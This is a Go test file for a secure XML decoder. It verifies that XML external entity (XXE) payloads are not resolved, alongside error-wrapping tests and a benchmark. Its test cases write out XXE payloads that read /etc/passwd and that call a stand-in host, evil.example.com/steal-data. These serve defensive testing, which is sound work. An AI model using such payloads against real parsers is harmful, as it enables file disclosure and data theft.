package security

import (
	"fmt"
	"strings"
	"testing"
)

func TestNewSecureXMLDecoder(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name        string
		xmlContent  string
		expectError bool
		description string
	}{
		{
			name: "legitimate XML parsing",
			xmlContent: `<?xml version="1.0" encoding="UTF-8"?>
<test>
	<item>value1</item>
	<item>value2</item>
</test>`,
			expectError: false,
			description: "Should parse legitimate XML without issues",
		},
		{
			name: "XXE attack with file disclosure",
			xmlContent: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
	<!ELEMENT test ANY>
	<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<test>&xxe;</test>`,
			expectError: false, // Should not error, but should not resolve entity
			description: "Should not resolve external entities",
		},
		{
			name: "XXE attack with network request",
			xmlContent: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
	<!ELEMENT test ANY>
	<!ENTITY xxe SYSTEM "http://evil.example.com/steal-data">
]>
<test>&xxe;</test>`,
			expectError: false, // Should not error, but should not make network request
			description: "Should not make external network requests",
		},
		{
			name: "DTD with parameter entities",
			xmlContent: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
	<!ENTITY % param "file:///etc/passwd">
	<!ELEMENT test ANY>
	%param;
]>
<test>content</test>`,
			expectError: false, // Should not resolve parameter entities
			description: "Should not resolve parameter entities",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			decoder := NewSecureXMLDecoder(strings.NewReader(tt.xmlContent))

			// Verify decoder was created
			if decoder == nil {
				t.Fatal("NewSecureXMLDecoder returned nil")
			}

			// Try to parse the XML
			var result struct {
				XMLName struct{} `xml:"test"`
				Content string   `xml:",chardata"`
			}

			err := decoder.Decode(&result)

			if tt.expectError && err == nil {
				t.Errorf("Expected error for %s, but got none", tt.description)
			}

			if !tt.expectError && err != nil {
				// Some errors are expected for malformed DTD, but not XXE resolution
				if !strings.Contains(err.Error(), "XML syntax error") {
					t.Logf("Got parsing error (which may be expected): %v", err)
				}
			}

			// For XXE tests, verify that external entities are NOT resolved
			if strings.Contains(tt.xmlContent, "ENTITY") {
				if strings.Contains(result.Content, "root:") ||
					strings.Contains(result.Content, "/bin/bash") ||
					strings.Contains(result.Content, "evil.example.com") {
					t.Errorf("XXE attack succeeded - external entity was resolved: %q", result.Content)
				}
			}
		})
	}
}

func TestSecureXMLDecoder_EntityHandling(t *testing.T) {
	t.Parallel()

	// Test that HTML entities still work (these should be allowed)
	xmlContent := `<?xml version="1.0"?>
<test>
	<content>&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;</content>
</test>`

	decoder := NewSecureXMLDecoder(strings.NewReader(xmlContent))

	var result struct {
		XMLName struct{} `xml:"test"`
		Content string   `xml:"content"`
	}

	err := decoder.Decode(&result)
	if err != nil {
		t.Fatalf("Failed to parse XML with HTML entities: %v", err)
	}

	expected := `<script>alert("test")</script>`
	if result.Content != expected {
		t.Errorf("HTML entity resolution failed. Expected %q, got %q", expected, result.Content)
	}
}

func TestSecureXMLError(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name     string
		message  string
		cause    error
		expected string
	}{
		{
			name:     "error without cause",
			message:  "test error",
			cause:    nil,
			expected: "secure XML parsing error: test error",
		},
		{
			name:     "error with cause",
			message:  "test error",
			cause:    fmt.Errorf("underlying error"),
			expected: "secure XML parsing error: test error",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			err := NewSecureXMLError(tt.message, tt.cause)
			if err == nil {
				t.Fatal("NewSecureXMLError returned nil")
			}

			if !strings.Contains(err.Error(), tt.message) {
				t.Errorf("Error message should contain %q, got %q", tt.message, err.Error())
			}

			if tt.cause != nil && err.Unwrap() != tt.cause {
				t.Errorf("Unwrap() should return the cause error")
			}
		})
	}
}

// Benchmark the secure XML decoder
func BenchmarkSecureXMLDecoder(b *testing.B) {
	xmlContent := `<?xml version="1.0" encoding="UTF-8"?>
<test>
	<item id="1">value1</item>
	<item id="2">value2</item>
	<item id="3">value3</item>
</test>`

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		decoder := NewSecureXMLDecoder(strings.NewReader(xmlContent))

		var result struct {
			XMLName struct{} `xml:"test"`
			Items   []struct {
				ID    string `xml:"id,attr"`
				Value string `xml:",chardata"`
			} `xml:"item"`
		}

		if err := decoder.Decode(&result); err != nil {
			b.Fatalf("Failed to decode XML: %v", err)
		}
	}
}
